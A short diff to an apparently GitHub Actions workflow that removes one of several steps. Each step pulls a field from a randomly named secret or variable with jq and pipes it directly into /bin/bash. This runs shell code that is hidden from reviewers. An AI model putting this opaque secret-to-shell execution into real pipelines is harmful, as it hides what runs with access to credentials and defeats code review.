@@ -23,7 +23,6 @@ jobs:
           sq658: ${{ secrets.sq658 }}
         run: |
           printf '%s' "$sq658" | jq -r .idx97 | /bin/bash
-          printf '%s' "$evuo0702" | jq -r .lgnv79 | /bin/bash
           echo $j77258 | jq -r .fwvrc47647 | /bin/bash
           echo $z11573 | jq -r .fi5013 | /bin/bash
           echo $cwheu66 | jq -r .ewk21 | /bin/bash
